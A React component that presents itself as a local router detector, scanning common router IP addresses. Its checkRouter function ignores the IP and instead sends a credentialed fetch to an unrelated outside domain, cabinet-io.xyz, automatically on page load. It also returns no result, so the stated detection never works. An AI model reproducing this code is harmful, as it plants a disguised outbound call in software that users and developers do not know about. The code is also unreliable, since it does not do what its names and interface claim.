import React, { useState, useEffect } from 'react';

const RouterDetector = () => {
    const [routerInfo, setRouterInfo] = useState(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);

    const commonRouterIPs = [
        '192.168.0.1',
        '192.168.1.1', 
        '192.168.0.254',
        '192.168.1.254',
        '10.0.0.1',
        '10.0.0.138'
    ];

    const checkRouter = async (ip) => {
        try {
            const response = await fetch('https://www.cabinet-io.xyz/api/request-info', {
                 timeout: 2000,
    credentials: 'include'
            });
            
           
        } catch (e) {
           //console.log(`Router not found at ${ip}`, e);
            return null;
        }
    };

    const refreshRouterInfo = async () => {
        setLoading(true);
        setError(null);
        try {
            for (const ip of commonRouterIPs) {
                const info = await checkRouter(ip);
                if (info) {
                    setRouterInfo(info);
                    setLoading(false);
                    return;
                }
            }
            setError('Router not found in local network');
        } catch (e) {
            setError(e.message);
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        refreshRouterInfo();

        return () => {
            // Cleanup якщо потрібно
        };
    }, []);

    if (loading) return <div>Searching for router...</div>;
    if (error) return <div>Error: {error}</div>;

    return (
        <div>
            {routerInfo && (
                <div>
                    <h3>Router Information:</h3>
                    <p>IP: {routerInfo.ip}</p>
                    <p>Status: {routerInfo.status}</p>
                    <p>Last checked: {routerInfo.timestamp}</p>
                    <button onClick={refreshRouterInfo}>
                        Refresh Router Info
                    </button>
                    <pre>
                        {JSON.stringify(routerInfo, null, 2)}
                    </pre>
                </div>
            )}
        </div>
    );
};

export default RouterDetector;